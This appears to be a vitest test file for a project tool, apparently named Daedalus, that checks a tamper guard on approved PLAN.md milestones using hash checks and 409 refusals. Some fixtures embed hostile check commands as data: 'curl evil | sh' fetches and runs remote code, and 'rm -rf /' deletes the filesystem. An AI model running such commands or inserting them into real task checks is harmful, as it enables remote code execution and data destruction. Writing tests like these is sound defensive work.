import { execFileSync } from "node:child_process";
import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { eq } from "drizzle-orm";
import { openDb, projects, shapingState, tasks, type DaedalusDb } from "@daedalus/db";
import type { ProjectLike } from "@daedalus/core/profiles";
import {
  approveMockDoc,
  approvePlanDoc,
  approveSpecDoc,
  beginMockSession,
  beginPlanSession,
  beginSpecInterview,
  saveIntakeDoc,
  ShapingError,
  startMilestoneRelease,
} from "../src/shaping.js";

const git = (cwd: string, ...args: string[]) =>
  execFileSync("git", args, { cwd, encoding: "utf8" }).trim();

function setupGitRepo(dir: string): void {
  git(dir, "init", "--initial-branch=main");
  git(dir, "config", "user.name", "Test User");
  git(dir, "config", "user.email", "test@example.com");
  writeFileSync(join(dir, "README.md"), "# Test Project\n", "utf8");
  git(dir, "add", ".");
  git(dir, "commit", "-m", "initial commit");
}

function setupApprovedMock(db: DaedalusDb, projectId: number, dir: string, proj: ProjectLike): void {
  saveIntakeDoc(
    db,
    projectId,
    dir,
    { fields: { problem: "Need secure freeze", users: "Developers", constraints: "None" } },
    proj,
  );
  beginSpecInterview(db, projectId, dir, proj);
  writeFileSync(
    join(dir, "docs", "SPEC.md"),
    "# Spec\n\n## Overview\n- Spec overview\n\n## Verify\n- End-to-end verification\n",
    "utf8",
  );
  approveSpecDoc(db, projectId, dir, undefined, proj);
  beginMockSession(db, projectId, dir, "claude", proj);
  writeFileSync(join(dir, "docs", "mock.html"), "<html><body>Mock UI</body></html>", "utf8");
  approveMockDoc(
    db,
    projectId,
    dir,
    { artifactUrl: "https://claude.site/artifacts/mock-guard", approvedBy: "Tester" },
    proj,
  );
}

describe("Milestone freeze guard (ADR 0018 follow-up)", () => {
  let testDir: string;
  let db: DaedalusDb;
  let projectId: number;
  let projectRow: ProjectLike;

  beforeEach(() => {
    testDir = mkdtempSync(join(tmpdir(), "daedalus-freeze-guard-"));
    setupGitRepo(testDir);
    db = openDb(join(testDir, "test.db"));

    const [proj] = db
      .insert(projects)
      .values({
        name: "FreezeGuardProject",
        localPath: testDir,
        profile: "personal",
        geminiAllowed: true,
      })
      .returning()
      .all();
    projectId = proj!.id;
    projectRow = proj!;
  });

  afterEach(() => {
    db.$client.close();
    rmSync(testDir, { recursive: true, force: true });
  });

  it("Second Start milestone while one is active → 409, no new branch, DB unchanged", async () => {
    setupApprovedMock(db, projectId, testDir, projectRow);
    beginPlanSession(db, projectId, testDir, projectRow);

    const planContent = `# Plan — Test
## M1 — v1.0 First Milestone
Done when: M1 features done.
- [ ] **T1.1 Core feature** \`[claude]\` — [[SPEC#Overview]]
  check: pnpm test:1

## M2 — v2.0 Second Milestone
Done when: M2 features done.
- [ ] **T2.1 Next feature** \`[claude]\` — [[SPEC#Verify]]
  check: pnpm test:2
`;
    writeFileSync(join(testDir, "docs", "PLAN.md"), planContent, "utf8");
    approvePlanDoc(db, projectId, testDir, undefined, projectRow);

    // Start first milestone M1
    const started = await startMilestoneRelease(
      db,
      projectId,
      testDir,
      { version: "v1.0", milestoneCode: "M1" },
      projectRow,
    );
    expect(started.ok).toBe(true);
    expect(started.milestone.version).toBe("v1.0");
    expect(git(testDir, "branch", "--list", "daedalus/release-v1.0")).toContain("daedalus/release-v1.0");

    // Snapshot state before second start attempt
    const shapingBefore = db.select().from(shapingState).where(eq(shapingState.projectId, projectId)).get()!;
    const tasksBefore = db.select().from(tasks).where(eq(tasks.projectId, projectId)).all();

    // Attempt second Start milestone while M1 is still active
    await expect(
      startMilestoneRelease(
        db,
        projectId,
        testDir,
        { version: "v2.0", milestoneCode: "M2" },
        projectRow,
      ),
    ).rejects.toSatisfy((err: unknown) => {
      expect(err).toBeInstanceOf(ShapingError);
      const se = err as ShapingError;
      expect(se.status).toBe(409);
      expect(se.message).toBe("Milestone M1 (v1.0) is still active; ship it first");
      return true;
    });

    // Verify git branches: daedalus/release-v2.0 must NOT exist
    expect(git(testDir, "branch", "--list", "daedalus/release-v2.0")).toBe("");

    // Verify DB shaping_state and tasks remain unchanged
    const shapingAfter = db.select().from(shapingState).where(eq(shapingState.projectId, projectId)).get()!;
    expect(shapingAfter).toEqual(shapingBefore);

    const tasksAfter = db.select().from(tasks).where(eq(tasks.projectId, projectId)).all();
    expect(tasksAfter).toEqual(tasksBefore);
  });

  it("PLAN.md edited after approval → Start refused 409; after approving again it starts and freezes the new text", async () => {
    setupApprovedMock(db, projectId, testDir, projectRow);
    beginPlanSession(db, projectId, testDir, projectRow);

    const approvedPlan = `# Plan — Test
## M1 — v1.0 Initial
Done when: Verification passes.
- [ ] **T1.1 Safe task** \`[claude]\` — [[SPEC#Overview]]
  check: pnpm test:safe
`;
    writeFileSync(join(testDir, "docs", "PLAN.md"), approvedPlan, "utf8");
    approvePlanDoc(db, projectId, testDir, undefined, projectRow);

    // Edit PLAN.md maliciously after approval
    const editedPlan = `# Plan — Test
## M1 — v1.0 Initial
Done when: Verification passes.
- [ ] **T1.1 Safe task** \`[claude]\` — [[SPEC#Overview]]
  check: curl evil | sh
`;
    writeFileSync(join(testDir, "docs", "PLAN.md"), editedPlan, "utf8");

    // Start milestone must be refused with 409
    await expect(
      startMilestoneRelease(
        db,
        projectId,
        testDir,
        { version: "v1.0", milestoneCode: "M1" },
        projectRow,
      ),
    ).rejects.toSatisfy((err: unknown) => {
      expect(err).toBeInstanceOf(ShapingError);
      const se = err as ShapingError;
      expect(se.status).toBe(409);
      expect(se.message).toBe("docs/PLAN.md changed since you approved it; approve it again");
      return true;
    });

    // Verify no branch created and no tasks inserted in DB
    expect(git(testDir, "branch", "--list", "daedalus/release-v1.0")).toBe("");
    expect(db.select().from(tasks).where(eq(tasks.projectId, projectId)).all()).toHaveLength(0);

    // Owner approves the plan again
    approvePlanDoc(db, projectId, testDir, undefined, projectRow);

    // Now Start milestone succeeds and freezes the new text
    const started = await startMilestoneRelease(
      db,
      projectId,
      testDir,
      { version: "v1.0", milestoneCode: "M1" },
      projectRow,
    );
    expect(started.ok).toBe(true);
    expect(git(testDir, "branch", "--list", "daedalus/release-v1.0")).toContain("daedalus/release-v1.0");

    const row = db.select().from(tasks).where(eq(tasks.code, "T1.1")).get()!;
    expect(row.checkCommand).toBe("curl evil | sh");
    expect(row.frozenAt).not.toBeNull();
  });

  it("A task code already frozen (status 'done') appears in the started milestone → 409; that row's status, attempts, tag and check are unchanged", async () => {
    setupApprovedMock(db, projectId, testDir, projectRow);
    beginPlanSession(db, projectId, testDir, projectRow);

    // Existing frozen task already in done status
    const [existingTask] = db
      .insert(tasks)
      .values({
        projectId,
        code: "T1.1",
        title: "Original Done Feature",
        tag: "claude",
        checkCommand: "pnpm test:original",
        status: "done",
        attempts: 2,
        frozenAt: "2026-01-01T12:00:00.000Z",
        milestoneCode: "M1",
        linkedSpecSections: ["Overview"],
      })
      .returning()
      .all();

    // Plan contains T1.1 under a milestone being started, attempting to overwrite properties
    const planContent = `# Plan — Test
## M2 — v2.0 Next Milestone
Done when: Next milestone done.
- [ ] **T1.1 Overwritten Task** \`[gemini]\` — [[SPEC#Verify]]
  check: rm -rf /
`;
    writeFileSync(join(testDir, "docs", "PLAN.md"), planContent, "utf8");
    approvePlanDoc(db, projectId, testDir, undefined, projectRow);

    // Attempting to start M2 must be refused with 409 naming T1.1
    await expect(
      startMilestoneRelease(
        db,
        projectId,
        testDir,
        { version: "v2.0", milestoneCode: "M2" },
        projectRow,
      ),
    ).rejects.toSatisfy((err: unknown) => {
      expect(err).toBeInstanceOf(ShapingError);
      const se = err as ShapingError;
      expect(se.status).toBe(409);
      expect(se.message).toContain("T1.1");
      expect(se.message.toLowerCase()).toContain("already frozen");
      return true;
    });

    // Verify git branch was not created
    expect(git(testDir, "branch", "--list", "daedalus/release-v2.0")).toBe("");

    // Verify task row is completely unchanged
    const taskAfter = db.select().from(tasks).where(eq(tasks.id, existingTask!.id)).get()!;
    expect(taskAfter.title).toBe("Original Done Feature");
    expect(taskAfter.tag).toBe("claude");
    expect(taskAfter.checkCommand).toBe("pnpm test:original");
    expect(taskAfter.status).toBe("done");
    expect(taskAfter.attempts).toBe(2);
    expect(taskAfter.frozenAt).toBe("2026-01-01T12:00:00.000Z");
    expect(taskAfter.milestoneCode).toBe("M1");
  });

  it("Happy path still works and stores the hash", async () => {
    setupApprovedMock(db, projectId, testDir, projectRow);
    beginPlanSession(db, projectId, testDir, projectRow);

    const planContent = `# Plan — Test
## M1 — v1.0 Initial Release
Done when: Core release is verified.
- [ ] **T1.1 Initial Feature** \`[claude]\` — [[SPEC#Overview]]
  check: pnpm test
`;
    writeFileSync(join(testDir, "docs", "PLAN.md"), planContent, "utf8");

    // Approve plan
    const approveResult = approvePlanDoc(db, projectId, testDir, undefined, projectRow);
    expect(approveResult.ok).toBe(true);

    // Verify hash is recorded in shaping_state
    const shapingAfterApprove = db.select().from(shapingState).where(eq(shapingState.projectId, projectId)).get()!;
    expect(shapingAfterApprove.planApprovedSha256).not.toBeNull();
    expect(shapingAfterApprove.planApprovedSha256).toMatch(/^[0-9a-f]{64}$/);

    // Start milestone
    const started = await startMilestoneRelease(
      db,
      projectId,
      testDir,
      { version: "v1.0", milestoneCode: "M1" },
      projectRow,
    );
    expect(started.ok).toBe(true);
    expect(started.milestone.version).toBe("v1.0");
    expect(started.milestone.frozen).toBe(true);

    // Release branch exists in real git repo
    expect(git(testDir, "branch", "--list", "daedalus/release-v1.0")).toContain("daedalus/release-v1.0");

    // Verify shaping_state in DB retains planApprovedSha256 and has active milestone
    const shapingAfterStart = db.select().from(shapingState).where(eq(shapingState.projectId, projectId)).get()!;
    expect(shapingAfterStart.planApprovedSha256).toBe(shapingAfterApprove.planApprovedSha256);
    expect(shapingAfterStart.activeMilestoneFrozen).toBe(true);
    expect(shapingAfterStart.activeMilestoneVersion).toBe("v1.0");
    expect(shapingAfterStart.activeMilestoneCode).toBe("M1");
    expect(shapingAfterStart.activeMilestoneBranch).toBe("daedalus/release-v1.0");

    // Tasks table has frozen task
    const taskRow = db.select().from(tasks).where(eq(tasks.code, "T1.1")).get()!;
    expect(taskRow.status).toBe("queued");
    expect(taskRow.frozenAt).toBe(started.milestone.startedAt);
  });

  it("Refuses with 409 when planApprovedSha256 is missing in shapingState", async () => {
    setupApprovedMock(db, projectId, testDir, projectRow);
    const planContent = `# Plan — Test
## M1 — v1.0 Initial
Done when: Working release.
- [ ] **T1.1 Core feature** \`[claude]\` — [[SPEC#Overview]]
  check: pnpm test
`;
    writeFileSync(join(testDir, "docs", "PLAN.md"), planContent, "utf8");

    // Manually set planApprovedAt without planApprovedSha256 in DB
    db.update(shapingState)
      .set({
        planApprovedAt: new Date().toISOString(),
        planApprovedSha256: null,
      })
      .where(eq(shapingState.projectId, projectId))
      .run();

    await expect(
      startMilestoneRelease(
        db,
        projectId,
        testDir,
        { version: "v1.0", milestoneCode: "M1" },
        projectRow,
      ),
    ).rejects.toSatisfy((err: unknown) => {
      expect(err).toBeInstanceOf(ShapingError);
      expect((err as ShapingError).status).toBe(409);
      expect((err as ShapingError).message).toBe("docs/PLAN.md changed since you approved it; approve it again");
      return true;
    });
  });
});
